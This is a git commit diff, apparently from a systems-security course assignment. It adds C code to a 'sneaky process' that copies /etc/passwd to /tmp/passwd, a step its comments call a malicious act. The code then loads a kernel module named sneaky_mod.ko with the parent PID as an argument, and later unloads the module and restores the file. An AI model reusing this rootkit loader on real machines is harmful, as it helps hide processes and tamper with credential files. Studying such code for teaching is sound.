ab66e512a2ad2035e1d011f35222bbeb36b51152
Rijish Ganguly <rijish96@gmail.com>
2019-03-27 01:46:51 -0400

    Done with sneaky process

--- sneaky_process.c
+++ sneaky_process.c
@@ -12,6 +12,81 @@ char * destination = "/tmp/passwd";
 
 
 
+void unload_module(){
+
+  pid_t unload_pid = fork();
+  
+  
+  if(unload_pid < 0){
+    perror("fork error for unloading module process");
+    exit(EXIT_FAILURE);
+  }
+  else if( unload_pid == 0){
+    ;
+    char * argv[2] = {"sneaky_mod.ko", NULL};
+     if(execvp("rmmod", argv) < 0){
+      perror( "execution error the module un-loading process");
+      exit(EXIT_FAILURE);
+    }
+  }
+  else{
+
+    int wait_status;
+    do {
+      pid_t wait_pid = waitpid(unload_pid, &wait_status, WUNTRACED | WCONTINUED);
+      if(wait_pid < 0){
+	perror("waitpid error");
+        exit(EXIT_FAILURE);
+	}
+
+    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
+    
+  }
+
+}
+
+
+
+
+void load_module(){
+
+  pid_t parent_process = getppid();
+  pid_t load_pid = fork();
+  
+  
+  if(load_pid < 0){
+    perror("fork error for loading module process");
+    exit(EXIT_FAILURE);
+  }
+  else if( load_pid == 0){
+
+    char module_arg[50];
+    sprintf(module_arg, "parent_id = %d\n", parent_process);
+    char * argv[3] = {"sneaky_mod.ko", module_arg, NULL};
+    
+    if(execvp("insmod", argv) < 0){
+      perror( "execution error the module loading process");
+      exit(EXIT_FAILURE);
+    }
+  }
+  else{
+
+    int wait_status;
+    do {
+      pid_t wait_pid = waitpid(load_pid, &wait_status, WUNTRACED | WCONTINUED);
+      if(wait_pid < 0){
+	perror("waitpid error");
+        exit(EXIT_FAILURE);
+	}
+
+    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
+    
+  }
+
+}
+
+
+
 
 void copy_file(char * src, char * destination){
 
@@ -53,22 +128,43 @@ void copy_file(char * src, char * destination){
 }
   else{
     fputs(line, file);
-    fclose(file)
+    fclose(file);
    }
+}
+
+
+
+void loop(){
+
+  int char_eq;
+  char_eq = getchar();
+  while(char_eq != 'q'){
+    char_eq = getchar();
+  }
+
 }
 
 
 
 int main(){
 
-
+  //Print process PID
   pid_t pid = getpid();
   printf("sneaky_process pid = %d\n", pid);
 
   //First malicious act. Copy /etc/passwd file to a new file: /tmp/passwd
   copy_file(src, destination);
   //Load the sneaky module using the insmod command
+  load_module();
+
+  //Enter a loop when the module is being uploaded
+  loop();
+
+  //Exit from the loop suggests removing the moduele using rmmod
+  unload_module();
+
+  //Restore the original file
+  copy_file(destination, src);
+
   
-
-
 }
